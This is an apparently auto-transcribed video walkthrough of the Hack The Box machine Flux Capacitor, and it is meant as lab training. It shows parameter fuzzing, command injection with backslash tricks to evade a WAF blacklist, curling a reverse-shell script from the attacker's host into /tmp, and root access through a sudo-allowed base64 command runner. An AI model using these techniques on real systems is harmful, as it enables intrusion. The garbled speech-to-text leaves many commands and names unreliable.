 what's going on YouTube this is IPSec and we'll be doing flux capacitor from hack the box which is a pretty unique machine because it depends pretty much purely on fuzzing and a lot of people didn't like that a lot of people like having a starting point having a logical progression how to go through the machine and then hitting the endpoint with fuzzing you pretty much just it's like the underpants gnomes you step1 fuzz step - yes the fuzzer did some crap step 3 will root and then you kind of piece together exactly how the fuzzer worked and if you hate fuzzing well I'm sorry it's just a fact of life if you look at like Tavis or MIDI Tavis oh and Twitter the super famous Google project zero security researcher he actually had found vulnerabilities in Windows Defender the windows in a virus created by Microsoft by porting it over to Linux because he had better fuzzing tools on Linux and instead of doing a bunch of static analysis etc he does like you know what let's kind of ignore this assembly for now let's get this on Linux and then we're just gonna send a bunch of junk through it and see when the program crashes and only examines the crashes and it's kind of the logic we're going through with flux capacitor its unique how we're fuzzing HTTP because generally we know what options and things descend this time we don't but yeah let's just jump in the machine it's a fun machine let's begin with V and map so and map - SC for default scripts SV and rewrite versions Oh a output all formats will call this file initial and put in the end map directory then the IP address of flux capacitor which is 10 10 10 69 I've already ran this because it does take a little bit of time so let's just look at the results and port 80 is open and the unique thing about this right now is we see port 80 open and a bunch of content and the reason is the version is super laughs laughs generally stands for a Web Application Firewall and this is nmap probably trying to figure out what the hell is going on because it's used to seeing like port 80 apache to nginx i is whatever Python HTTP server is it's not really used to seeing super web so it's doing some type of enumeration and we can verify that by let's go to Wireshark open this up and see exactly what nmap does so let's listen on ton zero and actually run the nmap string so and map that CSV we don't need a way we just want to do - p80 to scan port 80 - and disable dns because dns isn't in this environment and 10-10-10 69 now we can apply a filter like tcp dot destination port is equal to 80 and see all the requests going there we see ourselves doing a get slash and when we do that we can fold this tcp stream and see here's a request and here is the response the server is super web so that's how a map do that and here's the HTTP response from that so interesting enough we see some HTTP comments indicating there is a slash sync directory if we go back and instead of doing TCP deport equals 80 we can also just say show us HTTP packets and then we see and map doing an options request so this is probably the very first thing we saw on this end map if we look at the results that was a 404 first and then after four four it went to hundred then a four or five not allowed HTTP options if we look at the response for a 5 not allowed so this is probably that request so let's look at the very first HTTP request and see exactly what that 404 was ah looks like it's probably this and I don't know exactly what is requesting why and that decided to request nice ports to see I think is a comma and then Trinity dart at . back i think is what this is we can just copy this go to decoder smart to code nice boy it's calm attorney tax stop back yeah not sure exactly what ed maps looking for there so we can just google and map nice ports comma go to this first result and we can see exactly what it's looking for so let's see maybe it's something with I do I'm not exactly sure but and map does a bunch of weird things when it does exactly know what the services and tries to enumerate it and I guess that's the point we're driving home there but let's begin on our own HTTP enumeration and kind of just ignore exactly what and maps doing all we see is port 80 is open no other port yep only port 80 is open and we can also verify that by just catting and map initial dot GN map the grapple version and it doesn't have all the other information we just see port 80 open TCP HTTP super laughs so let's begin ern enumeration by going over to 10 10 10 at 69 and we can see the page we saw this in the end map a Wireshark output if we look at the HTTP source we do see a URL as slash sync so let's just go to that and we get a 403 forbidden open resti so this is probably the server that is running so let's copy this and while we do some research let's always do some type of recon the background with a HTTP server of course we're going to do a go Buster to see what other files are out there so let's do go Buster - w-4 a word list let's say user share word list what is it der buster then directory list 2.3 medium then we want to specify let's see the URL which is probably - you you think I'd have this memorized by now but now yeah - you HTTP 10-10-10 69 and we'll do - T 4 threads and say 30 threads and just let that go in the meantime let us poke around at the web server a little bit let's see like robots.txt does that exist no go to sync look at the source we just see open rusty so let's search open rusty and while that goes on open a new tab let's do search boy open rusty no results we can say open rusty see ve see if that has any C V's associated with it go into the web page we see it is a full-fledged web platform that integrates the standard engine X with Lua JIT so Lou is a scripting language and JIT generally stands for like just-in-time provisioning so yeah just-in-time compiler for the Lua programming language so it's just a different way to run webpages on engine X it looks like and go also going back to the Google we do see whoops wrong click a github for it so it's open source software looking for the CVE repository let's see there is a disputed CVE and not exactly sure what that is so let's go back to go Buster and see if we see anything we see a lot of status to hundreds on sink so we got sink sink toys sinking sinks can sink back see so let's go back to a firefox and we had slash sink and we got a 403 so that's a little bit odd because go Buster is saying 200 while Firefox is saying 403 so let us open up Wireshark and while go bus is running let's see if we see exactly what's going on so if we open up ton zero and search for HTTP I don't see what go bus is doing differently than a web browser so we see go Buster just get on slash Susie 9 let's follow this dream and we see the only thing really difference in the quest is the user agent we probably have a web browser say host is equal to 10 10 10 69 because we didn't edit or Etsy Hearst and that's how we're requesting it the page this would have been slashed sink so yeah let's go to a web browser for a book request go to proxy intercept dawn close out a Wireshark and refresh this page and let's change this to be something else because the other thing we saw in Wireshark was except encoding gzip we just didn't have deflate there if that shouldn't matter the main difference is this user agent thing so let's change this user agent string to be something other than Mozilla we could do that whole go Buster thing but I already closed why should I can don't feel like copying so we're gonna say please subscribe is our user agent and let's send this over to the repeater tab so we can see the response quickly and we see we get a 200 ok so if this user agent begins with Mozilla it's four three forbidden but anything other than Mozilla is the 200 okay so that is a bit odd let's change it back to please subscribe because you should subscribe if you like these videos anyways let's begin on the next thing we have to figure out whenever we hit slash sync we get a date so there's probably some argument we could send here and if we went to the slash if we remember from before it was please add timestamp with something like Ajax HTTP request on URL slash sync so let's go back here and say question mark Ajax is equal to yesterday and we're trying to get this to say 2018 0 5 1 0 which would be yesterday's day and that's still 11 let's say dollar dot Ajax still 11.8 Jack's still 11 Wow let's see what's another common option let's do date is equal to yesterday see if that's an argument well still all getting the same exact thing so let us use a different program and that program is called w funds which is a HTTP fuzzer so if we go to youtube I think I've used this in Co toric but a lot of times you can just search like tip SEC and then a program I use so let's do W fuzz if you want to see more usage of an application and my internet is going slow right now we see I've used W fuzz on both Catterick and B but let's look at this so W fuzz - H for help and we can see the options so we're going to want to do let's see we could do - Z and that it's a bit more complicated so we can do - Z file comma word list or we could just use - W for word list so what do - W word list we also probably want to do - C for colors because colors are awesome let's say we don't need a proxy and - you okay so we're going to want to do a word list which is essentially how we always use go Buster is specify a word list and just makes a bunch of HTTP requests and going through line by line we want to do - C so we see colors because that makes it more visible and easier to see things and we also of course need a URL so how W phone is well boy I even use W phones we have to figure out what word lists we want to use so I'm going to do a find user share word list and what we're looking for is a parameter so I'm just gonna grab - I for / am and we see we have user share word list SEC lists discovery web content Bert parameter names and this isn't actually a file that's default collie what I had done was I want to use a share word list and googled cyclist github one here and just did get clone that and that's why that file exists my Callie and not yours it's just a really good worthless github thing so anyways let's use this word list where you can go back to the first capacitor directory and do W fuzz - c4 colors then - W forward list so we're gonna enumerate the BIR parameter names text and we want to do - you for your L HTP 10 10 10 69 / sync then question mark because that's we specify parameters in a HTTP request and then W fuzz looks for fuzz and all capitals and wherever you have that it takes it line by line in that file and replaces it and let's say yesterday because we want to view yesterday's date if we view yesterday's date we accomplished that we assume we have some type of execution and those reason why we chose yesterday is because looking at the output we just see a date so we're trying to change this from 2018 0 5 11 - 2018 0 5 10 so hit over there and we see a bunch there was something red that just flew by but I want to cancel this and we're gonna say 19 characters as normal we don't care about anything that's 19 characters so if we do w fuzz - h4 help again we can see you can do - - H for height or - - s for shell and we want to hide characters so that for some reason is h h HC hide code HL hi mine HW hide words etc and if we go up we can see code lines words and then characters which is H so H is actually the second character in characters because C was already taken so that's how that works so we'll go up let's say - - h8 is equal to 19 because we don't care about anything that's 19 characters let's see if there's anything unique in this and we get a 403 whenever the parameter is opt so let's go back to a verb go to sink instead of D is equal yesterday the request that gets a 403 is opt is equal to yesterday and we see that there so if we do opt let's say gibberish does anything when we give opt go to a 403 and that's what we're testing now and now only yesterday does that we know of which is odd so I'm going to do is I'm gonna remove character by character and see when it goes to a four three so it yes it does at ye it doesn't so yes is equal to a four three forbidden which is odd to say the least so let us change this let's just add a backslash because back slashes don't really change anything we're scaping the e character and that does nothing so do it kind of say what we're doing do an LS we see we have let's just go to one file I don't know why that WL existed but anyways we have one file or directory enter thing if we do LS or Ecostar ster is a special character it's going to view every file in directory and then echo it we do backslash star now we see just star because we escape the special character we do echo hello of course we get hello we backslash anything it does nothing because we escaped L but escaping L does nothing because well it wasn't a special character begin with so the backslash just magically disappears so what we are doing is just adding a random backslash because if this is going to bash it's doing nothing but if yes is for some reason on some type of blacklist filter it's not gonna see yes anymore it's gonna see why backslash yes and that's exactly what happened so if we go back and do yesterday we still have the date if we add let's say let's try to code execution so let's do a semicolon at C for cat at C passwd we get a four or three so let's do the same thing again and get rid of each character and see where this for three is being created and it is the semicolon so we know there's a lot of bad characters and bad words right now so let's use W fuzz again if we do dub find user share word list and let's now grep this for care and we got one file in the sec list called special cares text if we view this file it's just a file of special characters and a lot of these like let's say the dollar sign can be used in command injection if we do like dollar parenthesis Hector who am i we can execute commands semicolon I'm sure there's an ampersand that it is so we want to see if there's filtering on special characters so let's go back to W fuzz and this time instead of parameter names we're going to change this to be special characters we're getting ready hi nineteen characters because that's no longer relevant when it changed the parameter be up and then we're gonna fuzz the content and we see let's see exclamation points allowed let's see dollar signs not parentheses is not star is not an parentheses not pipe is not backtick is another way you can ask you commands semicolons not directors or not and looking through this there's one thing that is odd about all this is all four threes have 175 characters in them so if we went back to burp just did stir to get a four three because this is a bad character we see the content length is 175 and that's what W fuzz is telling us if we do an underscore we get a content length of 19 however we have an anomaly when we do a single quote we get a content length of 1 which is odd so let's change your option is equal to just a single quote or apostrophe and we don't have to date anymore so that is definitely odd let us try saying huh maybe this is like doing and let's see get out of this maybe it's doing like exec is equal to command or something and then when we add that single quote we broke the command because we have an odd number of pasta fees so let's try something let's try single quote paying ten ten fourteen what is their IP IP is 30 so let's do a TCP dump - aye ICMP or not - I tun zero and we just want to view ICMP traffic and the server is pinging me that has not been cleaned up from me testing it probably yesterday so whoops anyways I guess we won't do a TCP dump let's change this to crap I'm just gonna kill the pings real quick I'm gonna pause the video kill the pings and we'll begin I forgot to revert this machine I think so my bad there so yeah okay the box has been reverted so we can do TCP dump - I ton zero ICMP and we no longer see traffic sorry about that so if we finish this command will ping 10 10 14 30 click go and we get a forbidden so again it becomes the plan of let's just erase characters until we get out of this forbidden thing because super wife is apparently blacks losing stuff and it looks like it blacklist @p I put ping so let's just add a random backslash and then do 10 10 14 30 which is an IP address and now we're still getting a 200 ok we're not getting any response back and if we add and let's say we had a 1 ' so let's add another one to jam a whole command in there and we get a weird thing back which is bash deci option acquires an argument and if we look back we're not getting any pings so let's see let's say let's add one space just for kicks and we don't get a response back here and we get responses here and the reason why I did one space is kind of odd it's not really intuitive but I was saying huh maybe if the option expecting some type of number because it's a date I'm gonna throw that and then we'll do a space for a different argument but we have verified we have code execution because now we're getting things back so we can change this to be like one space you name we get a four-three forbidden we're going to assume for some reason we can't say you name and backslash a bunch of random stuff and we get linux so if we do you name - are we get four one three zero - 17 generic so we have code execution definitely and the odd thing is if we had your L encoded this it doesn't work so we can't do URL encoding here which means if you are doing this box without using Berk and had just copy this and did let's say the same exact request op single quote one space you name space - are you got oh we need another single quote why do we get forbidden what is it request doing differently let's turn intercept on refresh repeater so let's see sent 20 and % 27 so you're all encoded the single quotes so if we see this let's do single quote single quote I wonder what bad character we hit okay paper sense a bad character if we go back to this looking through or bad characters percent it's not a bad character space their space here well still forbidden was dense between two and four oh crap we're sending the user-agent so what we should have done is let's go to options under the proxy tab and replace the user agent so under match and replace we can edit something and change the user agent to please subscribe because if we look at these repeater requests when we put in the URL we begin with Mozilla which is blacklisted so now if I just refresh this we can see it's doing all that URL stuff with the % 27 whatever and we still just get the date so if we unyu rel encode this which shouldn't really make a difference this is something I guess specific to open resti we get something different so we can't your own code the URL which is definitely odd but could have thrown some people for a loop so we have command execution let us try to put a file and because we can't do a bunch of special characters let's see if we want to do a URL we need a : we got that we got slashes let's see for it slash we have that - for like - Oh where's the - probably one of these the - the birth 200 let's say if I go up here search - Oh God darn it - healing because there's under specific different underscores I don't know if - is a special character let's just do repeater for - okay that's not a special character so we should be able to do curl 10 10 10 10 10 14 30 if - oh that's right - tap yep and before we do this let us do ALS and I've got to do a command we can do a pasta v-space and end this with apostrophe for some weird reason so before we do this let's just do a LS - la on / forbidden Oh LS and we'll just backspace random things because again we're dealing with sometimes blacklist that doesn't like words I guess but we can see everyone can write to temp so if we do LS la /tmp we can see the files here if we do let's do touched em hip click go forbidden so let's just backspace a bunch of crap we don't have any output we go back to the LS on temp we can see nobody new group earns the file imp and that's who we're running as there's nobody I guess if we just did a command execution for Who am I we get nobody if we did ID we get no group so that's who we are so we can write to slash temp so let's do a curl 1010 1430 slash it - OH temp and what we have to do is let's make a directory called web and then got put the file up and we're gonna go to is pen test monkey reverse shell cheat sheet I gotta turn intercept off on Burt and we're just gonna try the first shell and the reason why we're saving it to a file is because the first shells have a lot of bad characters almost every one of them is gonna have this slash and a web request can't contain that not slash that director and and is also a bad character there's so many bad characters in these of our shelves and we're HTTP request cannot contain any of those bad characters but if we write that to a file then we can execute that file without ending these characters and bypass that Web Application Firewall so that's what we're doing so we're gonna write to port 9000 1 because it's over 9000 and we're going to let's send it over a shoulder 9001 not right but and the IP is 10 10 10 14 at 10 10 14 30 which is us so you should be familiar with how to do reverse shells by now let's exit that Python M simple HTTP server and let's serve this on port 80 go back to Bert repeater we're curling us up to temp it and we get a 403 forbidden so let's do a echo command and then the again just start deleting things so after doing it we still get 403 so we know that isn't the bad character we've done temp before when we do LS it's not - I it's cool I should have guessed that so we'll go back and backspace a bunch of coal and - I requires an argument so let's do temp and we get forbidden so let's do again echo and we'll just escape this just in case echo is bad and then we'll go down the list until we get command execution so not temp it so - I slash stuff gives us an error because if we remove all that which is odd so let's just try removing the slash from that side maybe it's like / - / so let's do ec h o echo if we can echo that / we can echo that - we can echo that / we can echo that let's add spaces because that's how it was and we can't do that let's get rid of this / a tip we can do that add that / a tip can't do that get rid of the slash at the very end we can do that so we just can't have like / something - slap us something / which is weird but we're just enumerated how super woth is filtering requests and I guess doing / something - / is synonymous to doing some type of shell or weird commands so let's get rid of the slash on the left side because if it is just index dot HTML if we do a KO we can just do we have no it's running yeah if we have it as index.html if we curl ourselves we just get that file if that file isn't index.html a seedy web and we do the curl we get the directory listing so python simple HTTP server behaves kind of just like apache if you have an index it's gonna default to that so now when our web request let's do this so we got we can get rid of that KO curl 10 10 14 30 if we just call this knowing a bash command so now we should be able to do - Oh temp tip and right there so if we do now os - la slash temp we see it we see it is 42 characters long and if we did a cat temp yep forbidden because again I guess cat is blacklisted which is really annoying and we get the file so if we do a NC l vnp 9001 we can get rid of Python simple HTTP server and go back to Burt and we'll assume bash probably is going to be a blacklisted word that we can't say but we just add random back slashes to bypass the blacklist in execute temp we don't get anything back because we have a reverse shell so the very first thing we always do is a Python - see import PTY PTY not spawn then bash pythons not installed so we'll do Python 3 - see import BT YPT why not spawn and bash if I could type oh my god execute that control Z - background it s tu I - draw wall - echo F type F G then enter and now we have a shell we have to have autocomplete and all that stuff so from here we can do a sudo - L and we see that the user nobody can run commands all as all so as any user I can run any command so if we did cat Etsy passwd if I wanted to I could do sudo - you the middle Who am I no I can't do that sooner - you root that's weird okay so we have two eggs jump into the middle I could have swore I could just see it OSU that's weird so now we're going to enter a territory for me so we can execute Monnett as route so let's experiment with this the middle dot bonnet let's do la route can edit the file monit if we just go into root permissions denied I could have swore I could have just done sudo su before huh nope and if we go back to burp or do sudo - L I think we killed the web serve with a reverse shell to curl 10 10 10 69 yeah we killed the web server with the reverse shell so it's not threaded so I guess let's just do some live Prive esque and figure out what the hell is happening let's see the sudo - L Scotty with mana and mana is a process monitor so like you can make sure process is constantly running with mana and dot mana it's probably the config file we know we can't edit it so let's just look at what it is and it doesn't look come on a config file that is just executing base64 as a bash what is this let's see LSP so this Ubuntu deep package - L lists let's grab - I'm on it yeah - I'm installed so this is another silly thing but let's clear this all I figured out what's going on this is silly but well it'll get dumped on it we have dart Moderne it is a bash script and it threw me off a little bit because mana is an actual program if we google monit Linux yeah we see stuff but it's actually not installed it's just a bash script that is executing the command is base64 so if we look at this and just say echo - and bash base64 - basically for the would bash now Dola one wait if one is equal to CMD then echo - and - okay and then basic support SD so we have to do sudo su root we don't have to do that - Neil but anyways home the middle Mata we don't get asked for a password we can specify CMD this is dollar one and then dollar two is the command and we got to do it as base64 because what piping.this to basics for - d so we hit enter we execute this which this is bash and now we are root so that is the machine if we do WCC root / root X we get 33 because 32 characters is the md5 sum then you got the backslash n which is one character for a new line so yeah we have verified we are root and if we wanted to we can figure out exactly what is going on with this nginx stuff so if we go over dub-dub-dub where normally it is it's not a directory so if we do PS - EF grap engine X I let's type that we see the nginx configuration file is then user local open resting nginx config so let's go there because we're looking for worthy HTTP home directory is and we see that's just cat this is to have less all that stuff is commented out okay so let us just do one last thing let's grab - V any comp any comments and we also want to grab dot we'll read and read that's fine so here's the nginx config we've got two worker processes so this is why when we did a reverse shell the server pretty much went completely down and we can't call or do anything to it because you got the master process and one worker process I bet if this was three then we'd still be able to hit it because we'd have a backup process we just there's only two processes for nginx and with the rachelle we're always eating one of them and for the master process using one of them so yeah we just eat all the processes which is it done a lot of service access log to dev dolls so we're not logging access log listen on port 80 and this header server super waffe so this is why we don't see nginx because we have that add header thing modsecurity on look whose location slash sink so this is that initial one we see anything with the user agent mozilla or opera the block here's all the special characters that were blocking we're blocking user dot txt and text let's see so a blocking slash then space any number of spaces slash so it wasn't the - that we blocked so looking at this when we did opt we're under the assumption slash space slash no crap we don't want to service ourselves and see if we can fix that real quick and we're gonna kill over a shell in the process but that would be okay so let's at this file come on can we edit this easily echo term unknown export term is equal to let's see Tim screen there's a capital now we have a bunch of special characters there so let's just do V and copy this okay we can edit this welcome processes let's change this to ten and then we can do service nginx restart and that killed reverse shell I think we got something back but no response go back here no response we may have just heard the Box girl ten ten ten sixty-nine okay get to it can't do anything in my shell so yeah we here's the box so we're gonna revote real quick the box has now been reverted so let's face it that bash open a new one do it here and we can see that slash dot slash I think it was just slash space slash and that's also forbidden so it wasn't that / - Oh / that caused the error it was having a slash space and slash if you looked that wait list and I don't know why I closed that because I wanted to go back into my team ox history and view the wait list so I guess we have to get another shell so let's see we have that we don't have any history there so let's go back to web Python M simple HTTP server port 80 or do curl 1010 1430 - Oh temp yep spit in there we go yeah we got the reverse shell and then we got to do Python 3 that's great to root and then we can do sudo the middle Monnett CMD and then we also had to base64 bash ok we are now back to root so let's look at what the rest of the bad word list is so psdf grep nginx begin cat that file please remove all comments and then remove all blank lines so we just prove that slash space slash was blacklisted we got two dots is a blacklist I guess beginning with space is a blacklist maybe and then p.m. from file opener st nginx come from UNIX command text if we look at this file it's just a bunch of linux commands and all these are blacklisted so if you had any of these in your command you got a 4:3 now we have content by Lua block this is the actual open resti code remember open rusty was an Lu a thing for nginx exactly what Lu a stands for so let's search that and map uses the same exact thing it's a Lu a script for ED map scripts lua they were just google Lua scripts don't stand for anything oh maybe it doesn't actually stand for anything or maybe you just supposed to know Lua anyways this is a scripting language and map is written in you can do stuff in nginx as well I'm not a huge expert on this thought it'd be a lot easier to explain but apparently it's not and it's just something you may know you may not but we got local option is equal to date and then if engine X verg up then opt is equal to nginx so what this is saying is by default the option is date and if opt is set then opt is equal to that I guess - - is a comment so if we remove this comment and restart and nginx we would see debug CMD on the / sync page local handle so now we are executing home the middle check sank da top so this is how we specify guess the variable option and then we end it with a single quote and stuff so what we had done is we took this CMD so let's copy this and we can exactly explain what happened so we ex get in here so we did one space junk and it's doing a shell command pop open P open process open so we exit when we did was a command let's go back to Berk a command was m / NC bash temp so that is how it looks and what we did is we terminated the check sink with a single parenthesis and then we put commands here like - stuff we get a syntax error but if we added to the space there now we're executing two commands and we're still getting a syntax error right here is because we have an odd number of parenthesis so when we added the parenthesis at the end now we change command to be equal to home the middle check Cinque command and then we had to do a paren see at the end because it had a Brent see there if we didn't do that our number n cease and command fails so hopefully that makes sense exactly what happened and yeah that is the box so hope you guys enjoyed it take care and I'll price you sooner the next week if I can get around to recording tally if not then I'll see you guys next week take care bye